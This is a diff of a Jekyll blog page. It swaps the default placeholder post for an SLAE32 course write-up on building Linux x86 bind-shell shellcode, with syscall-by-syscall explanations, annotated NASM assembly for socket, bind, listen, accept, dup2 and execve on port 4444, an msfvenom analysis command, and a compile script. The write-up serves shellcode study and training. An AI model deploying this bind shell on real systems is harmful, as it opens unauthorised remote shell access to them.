@@ -7,8 +7,8 @@
 <meta name="generator" content="Jekyll v3.9.2" />
 <meta property="og:title" content="SLAE32" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated." />
-<meta property="og:description" content="You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated." />
+<meta name="description" content="Description of the assignment Create a Shell_Bind_TCP Shellcode: Binds to a port; Execs Shell on incoming connection; Port should be easily configurable." />
+<meta property="og:description" content="Description of the assignment Create a Shell_Bind_TCP Shellcode: Binds to a port; Execs Shell on incoming connection; Port should be easily configurable." />
 <link rel="canonical" href="http://localhost:4000/slae32/2022/09/14/Bind.html" />
 <meta property="og:url" content="http://localhost:4000/slae32/2022/09/14/Bind.html" />
 <meta property="og:site_name" content="Jeremy Catelain" />
@@ -17,7 +17,7 @@
 <meta name="twitter:card" content="summary" />
 <meta property="twitter:title" content="SLAE32" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-09-14T08:45:58+02:00","datePublished":"2022-09-14T08:45:58+02:00","description":"You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.","headline":"SLAE32","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/slae32/2022/09/14/Bind.html"},"url":"http://localhost:4000/slae32/2022/09/14/Bind.html"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-09-14T08:45:58+02:00","datePublished":"2022-09-14T08:45:58+02:00","description":"Description of the assignment Create a Shell_Bind_TCP Shellcode: Binds to a port; Execs Shell on incoming connection; Port should be easily configurable.","headline":"SLAE32","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/slae32/2022/09/14/Bind.html"},"url":"http://localhost:4000/slae32/2022/09/14/Bind.html"}</script>
 <!-- End Jekyll SEO tag -->
 <link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Jeremy Catelain" /></head>
 <body><header class="site-header" role="banner">
@@ -45,30 +45,436 @@
             <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
 
     <header class="post-header">
-        <h1 class="post-title p-name" itemprop="name headline">SLAE32</h1>
-        <p class="post-meta">
+        <div  class="post-header-about">
+            <h1 class="post-list-heading2 p-name" itemprop="name headline">SLAE32</h1>
+            <h1 class="post-list-heading3 p-name" itemprop="name headline">|  Assignment 1 - Bind Shell</h1>
+        </div>
+        <p class="post-meta-title">
             <time class="dt-published" datetime="2022-09-14T08:45:58+02:00" itemprop="datePublished">Sep 14, 2022
             </time></p>
     </header>
 
     <div class="post-content e-content" itemprop="articleBody">
-        <p>You’ll find this post in your <code class="language-plaintext highlighter-rouge">_posts</code> directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run <code class="language-plaintext highlighter-rouge">jekyll serve</code>, which launches a web server and auto-regenerates your site when a file is updated.</p>
+        <h3 id="-description-of-the-assignment-"><span style="color:#2d8fb3;"> Description of the assignment </span></h3>
 
-<p>Jekyll requires blog post files to be named according to the following format:</p>
+<ul>
+  <li>Create a Shell_Bind_TCP Shellcode:
+    <ul>
+      <li>Binds to a port;</li>
+      <li>Execs Shell on incoming connection;</li>
+    </ul>
+  </li>
+  <li>Port should be easily configurable.</li>
+</ul>
 
-<p><code class="language-plaintext highlighter-rouge">YEAR-MONTH-DAY-title.MARKUP</code></p>
+<!--more-->
 
-<p>Where <code class="language-plaintext highlighter-rouge">YEAR</code> is a four-digit number, <code class="language-plaintext highlighter-rouge">MONTH</code> and <code class="language-plaintext highlighter-rouge">DAY</code> are both two-digit numbers, and <code class="language-plaintext highlighter-rouge">MARKUP</code> is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.</p>
+<h3 id="-msfvenom-example--socket_call-"><span style="color:#2d8fb3;"> MSFVenom example &amp; Socket_call </span></h3>
 
-<p>Jekyll also offers powerful support for code snippets:</p>
+<p>To perform this exercise, we started by analysing the bind shell code of Metasploit to see how it works and what syscall are made. To do so, we followed the steps as follows to create an image of the different syscalls performed and to make it more visible.</p>
 
-<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="k">def</span> <span class="nf">print_hi</span><span class="p">(</span><span class="nb">name</span><span class="p">)</span>
-  <span class="nb">puts</span> <span class="s2">"Hi, </span><span class="si">#{</span><span class="nb">name</span><span class="si">}</span><span class="s2">"</span>
-<span class="k">end</span>
-<span class="n">print_hi</span><span class="p">(</span><span class="s1">'Tom'</span><span class="p">)</span>
-<span class="c1">#=&gt; prints 'Hi, Tom' to STDOUT.</span></code></pre></figure>
+<p>As follows the command lines to generate the graphical schema of the metasploit bind shell :</p>
 
-<p>Check out the <a href="https://jekyllrb.com/docs/home">Jekyll docs</a> for more info on how to get the most out of Jekyll. File all bugs/feature requests at <a href="https://github.com/jekyll/jekyll">Jekyll’s GitHub repo</a>. If you have questions, you can ask them on <a href="https://talk.jekyllrb.com/">Jekyll Talk</a>.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    msfvenom -p linux/x86/shell_bind_tcp R | /opt/hackingtools/libemu/tools/sctest/sctest -vvv -Ss 100000 -G shell_bind_tcp.dot
+    //Then convert into PNG file :
+    dot shell_bind_tcp.dot -Tpng -o shell_bin_tcp.png 
+</code></pre></div></div>
+
+<p><strong>Result:</strong></p>
+
+<p><img src="/assets/slae32-img/assignment1/shell_bin_tcp.png" alt="drawing" style="max-width:100%;" /></p>
+
+<p>As we can see, there are 6 syscalls performed : socket, bind, listen, accept, dup2, execve</p>
+
+<p>Each of them will be detailled in the following section.</p>
+
+<h3 id="-socketcall-"><span style="color:#2d8fb3;"> Socketcall </span></h3>
+
+<p>The first thing that we identified in the first syscall is the EAX value set to 0x66 (102 in decimal) related as we can see below to the “socketcall” syscall.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    root@kali:~# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 102
+    #define __NR_socketcall 102
+    #define __NR_socket 359
+    #define __NR_socketpair 360
+</code></pre></div></div>
+
+<p>Then we look into more details about that syscall:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    man 2 socketcall
+    int socketcall(int call, unsigned long *args);
+</code></pre></div></div>
+
+<p>The socketcall is composed of two parameters:</p>
+
+<p>1) int call - Type of the syscall (socket, bind, …)</p>
+
+<p>2) unsigned long* args - Arguments of the desired syscall</p>
+
+<h3 id="-socket-"><span style="color:#2d8fb3;"> Socket </span></h3>
+
+<p>The socket syscall creates a socket which will listen to the incoming connections.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man 2 socket 
+int socket(int domain, int type, int protocol)
+</code></pre></div></div>
+
+<p>The syscall is composed of the following parameters:</p>
+
+<p>1) int domain - The protocol family used (AF_INET, AF_LOCAL, …)</p>
+
+<p>2) int type - The type of the service (TCP, UDP, …)</p>
+
+<p>3) int protocol - Specify if a particular protocol will be used with the socket (0 most of the time)</p>
+
+<p>Note: More details can be find on the possible parameter values in the following paths:</p>
+<ul>
+  <li>/usr/include/x86_64-linux-gnu/bits/socket.h (DOMAIN AND PROTOCOLS parameters)</li>
+  <li>/usr/include/x86_64-linux-gnu/bits/socket_type.h (TYPE parameter)</li>
+</ul>
+
+<p>So, we want to set the following parameters:</p>
+<ul>
+  <li>EAX = 0x66 (socketcall syscall)</li>
+  <li>EBX = 0x1 (SOCKET syscall)</li>
+  <li>ECX (Address pointing to the arguments into the stack):
+    <ul>
+      <li>ECX[0] = 0x2 (PF_INET/AF_INET, IP protocol family)</li>
+      <li>ECX[1] = 0x1 (SOCK_STREAM, TCP connection based)</li>
+      <li>ECX[2] = 0x0 (Unspecified)</li>
+    </ul>
+  </li>
+</ul>
+
+<p>After that the syscall is performed with success, the file descriptor returned will be stored in the EAX register.</p>
+
+<p>Useful link : The details of the <em>socket</em> can be find in the following links :</p>
+<ul>
+  <li><a href="http://shtroumbiniouf.free.fr/CoursInfo/Reseau2/Cours/SocketsBSD/SocketsBSD.html" style="color:#2d8fb3;">shtroumbiniouf.free.fr (French link)</a></li>
+  <li><a href="http://sdz.tdct.org/sdz/les-sockets.html" style="color:#2d8fb3;">sdz.tdct.org (French link)</a></li>
+</ul>
+
+<p><strong>Assembly Code:</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ; EBX
+    xor ebx, ebx
+    push ebx ; push the x00000000 on the stack
+    inc ebx ; SYS_SOCKET call 1 for socket
+    push ebx ; push the 0x00000001 on the stack for the domain AF_INET of the SYS_SOCKET call 
+    ; ECX
+    push byte 0x2 ; push the 0x00000002 on the stack for the type SOCK_STREAM
+    mov ecx, esp ; put the arguments of the socketcall into ECX
+    ; EAX
+    xor eax, eax
+    mov al, 0x66
+    ; socket call
+    int 0x80
+</code></pre></div></div>
+
+<h3 id="-bind-"><span style="color:#2d8fb3;"> Bind </span></h3>
+
+<p>After the creation of the socket we need to bind it to an address.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    man 2 bind 
+    int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+</code></pre></div></div>
+
+<p>With:</p>
+
+<p>1) sockfd : File descriptor, return value of the socket syscall</p>
+
+<p>2) sockaddr *addr : address argument which depends on the family</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    struct sockaddr {
+        sa_family_t sa_family;
+        char        sa_data[14];
+    }
+</code></pre></div></div>
+
+<p>In our case, with the Internet Family AF_INET, the address structure will be constructed as follows :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    struct sockaddr_in {
+        sa_family_t    sin_family; /* address family: AF_INET */
+        in_port_t      sin_port;   /* port in network byte order */
+        struct in_addr sin_addr;   /* internet address */
+    };
+
+    /* Internet address. */
+    struct in_addr {
+        uint32_t       s_addr;     /* address in network byte order */
+    };
+</code></pre></div></div>
+
+<p>Note: From “/usr/src/linux-headers-5.2.0-kali2-common/include/uapi/linux/in.h”</p>
+
+<ul>
+  <li>addrlen : The size, in bytes, of the address structure pointed to by addr</li>
+</ul>
+
+<p>Useful Link:</p>
+<ul>
+  <li><a href="https://man7.org/linux/man-pages/man7/ip.7.html" style="color:#2d8fb3;">man7.org (IP manual)</a></li>
+  <li><a href="https://www.scip.ch/en/?labs.20200521" style="color:#2d8fb3;">www.scip.ch (Example)</a></li>
+</ul>
+
+<p>This means that we need to pass the following registers:</p>
+<ul>
+  <li>EAX = 0x66 (SOCKET_CALL)</li>
+  <li>EBX = 0x2 (SYS_BIND)</li>
+  <li>ECX (Address pointing to the arguments into the stack):
+    <ul>
+      <li>ECX[0] = File descriptor (Return value of the socket syscall)</li>
+      <li>ECX[1] (Address pointing to arguments into the stack):
+        <ul>
+          <li>ECX[1.0] = 0x2 (AF_INET)</li>
+          <li>ECX[1.1] = 0x115c (port 4444 in hexa)</li>
+          <li>ECX[1.2] = 0x00000000 (IP : 0.0.0.0)</li>
+        </ul>
+      </li>
+      <li>ECX[2] = 0x10 (16 bytes)</li>
+    </ul>
+  </li>
+</ul>
+
+<p>The return value stored in EAX should be 0x00 in case of success!</p>
+
+<p>Note that if we want to set up another IP such as 127.0.0.1, you need to convert each value in hexadecimal and push them in reverse into the stack.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python hex(value)
+Result : 
+    127 : 0x7f
+    0   : 0x00
+    0   : 0x00
+    1   : 0x1
+Then push then into the stack in reverse order (0x0100007f).
+</code></pre></div></div>
+
+<p><strong>Assembly Code:</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ; EBX - SYS_SOCKET call 2 for bind
+    pop ebx 
+    ; ECX
+    ; Creation of the struct sockaddr_in
+    xor edi, edi
+    push edi ; Push on the stack the IP address 0.0.0.0
+    push word 0x5c11 ; Push on the stack the port 4444 TO MODIFY IF NEEDED
+    push bx ; Push the Family AF_INET = 2
+    mov ecx, esp ; mov the structure into ecx
+    ; Put all parameters into ECX
+    push byte 0x10 ; Push on the stack the address length of 16
+    push ecx ; 
+    push eax ; push the file descriptor
+    mov ecx, esp ; Move the stack into ECX
+    ; EAX
+    xor eax, eax
+    mov al, 0x66
+    ; bind call
+    int 0x80
+</code></pre></div></div>
+
+<h3 id="-listen-"><span style="color:#2d8fb3;"> Listen </span></h3>
+
+<p>After that the socket has been binded, we need to listen to this socket. Listen() marks the socket referred by the sockfr as a passive socket, a socket that will be used to accept incoming connection requests using accept().</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    man 2 listen
+    int listen(int sockfd, int backlog)
+</code></pre></div></div>
+
+<p>The syscall is composed of the following arguments:</p>
+
+<p>1) int sockfd : File descriptor</p>
+
+<p>2) int backlog : Argument defining the maximum length to which the queue of pending connections for sockfr may grow</p>
+
+<p>Then we will pass the following arguments :</p>
+<ul>
+  <li>EAX = 0x66 (SOCKET_CALL)</li>
+  <li>EBX = 0x4 (SYS_LISTEN)</li>
+  <li>ECX (Address pointing to the arguments into the stack):
+    <ul>
+      <li>ECX[0] = sockfd (file descriptor which is the return value of the socket)</li>
+      <li>ECX[1] = 0x0 (no need of backlog)</li>
+    </ul>
+  </li>
+</ul>
+
+<p>The return value stored in EAX must be 0x00 in case of success.</p>
+
+<p><strong>Assembly Code:</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    pop esi ; Retrieve the file descriptor
+    ; EAX &amp; ECX backlog
+    push edi ; Push on the stack 0 for the backlog 
+    xor eax, eax
+    mov al, 0x66 ; Set up EAX
+    ; EBX, 4 for listen 
+    mov bl, 0x4
+    ; ECX 
+    push esi
+    mov ecx, esp
+    ; SYS CALL LISTEN
+    int 0x80
+</code></pre></div></div>
+
+<h3 id="-accept-"><span style="color:#2d8fb3;"> Accept </span></h3>
+
+<p>Then, when there is an incoming connection to the socket, we need to accept that connection with the accept() function.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    man 2 accept
+    int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
+</code></pre></div></div>
+
+<p>The syscall is composed of the following arguments:</p>
+
+<p>1) int sockfd : File descriptor</p>
+
+<p>2) struct sockaddr *addr : Pointer to the remote address</p>
+
+<p>3) socklen_t *addrlen : Pointer to the address length</p>
+
+<p>Then, we will pass the following arguments :</p>
+<ul>
+  <li>EAX = 0x66 (SOCKET_CALL)</li>
+  <li>EBX : 0x5 (SYS_ACCEPT)</li>
+  <li>ECX :
+    <ul>
+      <li>ECX[0] = sockfd (file descriptor which is the return value of the socket call)</li>
+      <li>ECX[1] = 0x00000000 (Address of the peer socket)</li>
+      <li>ECX[2] = 0x00000000 (NULL because the address is NULL)</li>
+    </ul>
+  </li>
+</ul>
+
+<p>On success, the system call will return in the EAX register a file descriptor for the accepted socket.</p>
+
+<p><strong>Assembly Code:</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ; EAX
+    mov al, 0x66
+    ; EBX 
+    inc ebx 	; 5 for the ACCEPT SYS CALL
+    ; ECX
+    push edi	; NULL - address of the peer 
+    push edi	; NULL 	
+    push esi	; file descriptor
+    mov ecx, esp
+    int 0x80
+</code></pre></div></div>
+
+<h3 id="-dup2-"><span style="color:#2d8fb3;"> Dup2 </span></h3>
+
+<p>The next step is to redirect the STDIN, STDOUT and STDER to the socket session. The dup2() system call allocate a new file descriptor that refers to the same open file description as the descriptor oldfd. The file descriptor newfd is ajusted so that it refers to the same open file desdcription as oldfd.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    root@kali:~# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep dup2
+        #define __NR_dup2 63
+
+    man 2 dup2
+    int dup2(int oldfd, int newfd)
+</code></pre></div></div>
+
+<p>The function is composed of:</p>
+
+<p>1) int oldfd : File descriptor returned by the accept syscall</p>
+
+<p>2) int newfd : File descriptor that we want to refer to</p>
+
+<p>We will pass the following arguments :</p>
+<ul>
+  <li>EAX : 0x3f (dup syscall, 63 in decimal)</li>
+  <li>EBX : Previous EAX (File descriptor returned by the accept call)</li>
+  <li>ECX : 0x2 to 0x0 (loop IN, OUT, ERR)</li>
+</ul>
+
+<p>To perform the loop, we will use the intruction “JNS rel8” because it perform the jmp until the Sign Flag is set (SF=1), which mean that the zero is taken into account in the loop :</p>
+
+<p><strong>Assembly Code:</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        ; EBX, File descriptor return by ACCEPT call
+        mov ebx, eax	; Retrieve the file descriptor
+
+        ; EAX, dup2 sys call 0x3f
+        xor eax, eax
+
+        ; initialize ECX 
+        xor ecx, ecx
+        mov cl, 0x2
+
+        ; LOOP
+
+    DupLoop :
+ 
+        mov al, 0x3f
+        int 0x80
+        dec ecx
+        jns DupLoop	
+</code></pre></div></div>
+
+<h3 id="-execve-"><span style="color:#2d8fb3;"> Execve </span></h3>
+
+<p>Now that we created a socket which is listening and accepting the connections, we will create the part of the code which will launch the execve syscall when someone is connecting to it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    man 2 Execve
+    int execve(const char *pathname, char *const argv[], char *const envp[])
+</code></pre></div></div>
+
+<p>The arguments are:</p>
+
+<p>1) const char *pathname: Pointer to the filename</p>
+
+<p>2) char *const argv[]: Pointer to the argument of the function</p>
+
+<p>3) char *const envp[]: Array of pointers to strings passed as environment of the new program</p>
+
+<p>We will pass the following arguments :</p>
+<ul>
+  <li>EAX : 0xb (execve sys call, 11 in decimal)</li>
+  <li>EBX : Pointer to /bin//sh + 0X00000000</li>
+  <li>ECX : Pointer to the address of EBX</li>
+  <li>EDX : NULL</li>
+</ul>
+
+<p>To pass the argument /bin/sh, we first converted it in hexadecimal and then reverse it.</p>
+
+<p><strong>Assembly Code:</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>; Push the 0x00000000 on the stack
+xor eax, eax
+push eax
+; put the string on the stack
+push 0x68732f2f
+push 0x6e69622f
+; setup EBX with the vlue of ESP
+mov ebx, esp
+; set up EDX and push null bytes again
+push eax
+mov edx, esp
+; set up ECX argv address on the first dw and null in second dw
+push ebx 
+; Then move the top of the stack into ECX
+mov ecx, esp
+; EAX
+mov al, 0xb
+int 0x80
+</code></pre></div></div>
+
+<h3 id="-compilation-"><span style="color:#2d8fb3;"> Compilation </span></h3>
+
+<p>Then we compiled the code with the following python script :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/bindshell# cat ../compile.sh 
+#! /bin/bash
+
+echo '[+] Assembling with NASM'
+nasm -f elf -o $1.o $1.nasm
+
+echo '[+] Linking ..'
+ld -m elf_i386 $1.o -o $1
+
+echo '[+] Done!'
+</code></pre></div></div>
+
+<p>And finally, we launch the bind shellcode and connect to it with the netcat tool.</p>
+
+<p><img src="/assets/slae32-img/assignment1/assess1-result.PNG" alt="drawing" style="max-width:100%;" /></p>
 
 
     </div><a class="u-url" href="/slae32/2022/09/14/Bind.html" hidden></a>
